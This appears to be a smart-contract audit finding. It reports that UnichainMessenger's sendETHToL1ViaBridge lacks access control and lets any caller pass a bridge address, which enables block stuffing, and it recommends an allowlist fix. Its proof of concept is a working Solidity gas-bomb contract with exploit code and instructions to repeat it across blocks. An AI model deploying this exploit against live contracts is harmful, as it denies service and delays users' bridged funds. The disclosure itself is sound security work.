### Title
Unguarded `sendETHToL1ViaBridge` in `UnichainMessenger` Allows Arbitrary `l2bridge` to Exhaust Block Gas — (`contracts/bridges/UnichainMessenger.sol`)

---

### Summary

`UnichainMessenger.sendETHToL1ViaBridge` has no access control and accepts a fully caller-controlled `l2bridge` address with no allowlist. Any attacker can pass a malicious contract whose `bridgeETHTo` burns all forwarded gas, consuming the entire Unichain block gas limit in a single transaction.

---

### Finding Description

`sendETHToL1ViaBridge` is declared `external payable nonReentrant` with no role guard: [1](#0-0) 

The only validation is `msg.value == value`. There is no check that `l2bridge` is the canonical Unichain bridge, no allowlist, and no zero-address guard (contrast with `LineaMessenger`, which at least calls `UtilLib.checkNonZeroAddress`).

The external call forwards **all remaining gas** to the attacker-supplied address:

```solidity
IUnichainMessenger(l2bridge).bridgeETHTo{ value: value }(target, DEFAULT_GAS_LIMIT, bytes(""));
```

`DEFAULT_GAS_LIMIT = 200_000` is the `_minGasLimit` parameter for L1 execution — it is **not** a gas cap on the L2 call itself. [2](#0-1) 

The legitimate callers (`bridgeAssetsViaNativeBridge` in pool contracts) are protected by `onlyRole(BRIDGER_ROLE)` and pass the admin-configured `l2Bridge` storage variable: [3](#0-2) 

But `UnichainMessenger` itself is a standalone contract with no such protection, so the attacker bypasses the pool entirely and calls the messenger directly.

---

### Impact Explanation

An attacker deploys a contract whose `bridgeETHTo` runs an infinite loop (or `INVALID` opcode), then calls `UnichainMessenger.sendETHToL1ViaBridge(maliciousContract, anyAddress, 1)` with `msg.value = 1 wei`. The transaction consumes the full block gas limit. Repeated submissions stuff consecutive Unichain blocks, delaying or preventing the `BRIDGER_ROLE`'s `bridgeAssetsViaNativeBridge` transaction from being included.

**Impact: Low — Block stuffing.**

---

### Likelihood Explanation

The function is publicly callable with no prerequisites beyond holding 1 wei. The attack is cheap relative to the disruption caused (attacker pays gas, but Unichain gas costs are low). The path is direct and requires no privileged access, no front-running, and no external protocol compromise.

---

### Recommendation

Add an immutable allowlisted bridge address and validate `l2bridge` against it, or restrict `sendETHToL1ViaBridge` to a role (e.g., `BRIDGER_ROLE`) so only the pool contracts can invoke it:

```solidity
address public immutable CANONICAL_L2_BRIDGE;

function sendETHToL1ViaBridge(address l2bridge, address target, uint256 value)
    external payable nonReentrant
{
    if (l2bridge != CANONICAL_L2_BRIDGE) revert InvalidBridge();
    if (msg.value != value) revert MismatchedMsgValue();
    IUnichainMessenger(l2bridge).bridgeETHTo{ value: value }(target, DEFAULT_GAS_LIMIT, bytes(""));
}
```

The same pattern should be applied to `BaseMessenger`, `OptimismMessenger`, `ArbitrumMessenger`, and `ScrollMessenger`, which share the identical lack of access control. [4](#0-3) [5](#0-4) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

contract GasBombBridge {
    // Implements IUnichainMessenger.bridgeETHTo — burns all gas
    function bridgeETHTo(address, uint32, bytes memory) external payable {
        assembly { invalid() } // consumes all forwarded gas
    }
    receive() external payable {}
}

contract BlockStuffingTest {
    function exploit(address unichainMessenger) external payable {
        GasBombBridge bomb = new GasBombBridge();
        // msg.value = 1 wei; entire block gas limit consumed
        IUnichainMessenger(unichainMessenger).sendETHToL1ViaBridge{value: 1}(
            address(bomb), address(0xdead), 1
        );
    }
}
```

Deploy `GasBombBridge`, call `exploit` with 1 wei. The call to `bomb.bridgeETHTo` triggers `INVALID`, consuming all gas forwarded by `sendETHToL1ViaBridge`. Repeat across blocks to prevent the `BRIDGER_ROLE` from landing `bridgeAssetsViaNativeBridge`.

### Citations

**File:** contracts/bridges/UnichainMessenger.sol (L16-16)
```text
    uint32 public constant DEFAULT_GAS_LIMIT = 200_000;
```

**File:** contracts/bridges/UnichainMessenger.sol (L24-27)
```text
    function sendETHToL1ViaBridge(address l2bridge, address target, uint256 value) external payable nonReentrant {
        if (msg.value != value) revert MismatchedMsgValue();
        IUnichainMessenger(l2bridge).bridgeETHTo{ value: value }(target, DEFAULT_GAS_LIMIT, bytes(""));
    }
```

**File:** contracts/pools/RSETHPoolNoWrapper.sol (L431-444)
```text
    function bridgeAssetsViaNativeBridge() external nonReentrant onlyRole(BRIDGER_ROLE) {
        UtilLib.checkNonZeroAddress(l2Bridge);
        UtilLib.checkNonZeroAddress(messenger);
        UtilLib.checkNonZeroAddress(l1VaultETHForL2Chain);

        // withdraw ETH - fees
        uint256 ethBalanceMinusFees = getETHBalanceMinusFees();

        IL2Messenger(messenger).sendETHToL1ViaBridge{ value: ethBalanceMinusFees }(
            l2Bridge, l1VaultETHForL2Chain, ethBalanceMinusFees
        );

        emit BridgedETHToL1ViaNativeBridge(l1VaultETHForL2Chain, ethBalanceMinusFees);
    }
```

**File:** contracts/bridges/BaseMessenger.sol (L23-26)
```text
    function sendETHToL1ViaBridge(address l2bridge, address target, uint256 value) external payable nonReentrant {
        if (msg.value != value) revert MismatchedMsgValue();
        IBaseMessenger(l2bridge).bridgeETHTo{ value: value }(target, DEFAULT_GAS_LIMIT, bytes(""));
    }
```

**File:** contracts/bridges/OptimismMessenger.sol (L24-27)
```text
    function sendETHToL1ViaBridge(address l2bridge, address target, uint256 value) external payable nonReentrant {
        if (msg.value != value) revert MismatchedMsgValue();
        IOptimismMessenger(l2bridge).bridgeETHTo{ value: value }(target, DEFAULT_GAS_LIMIT, bytes(""));
    }
```
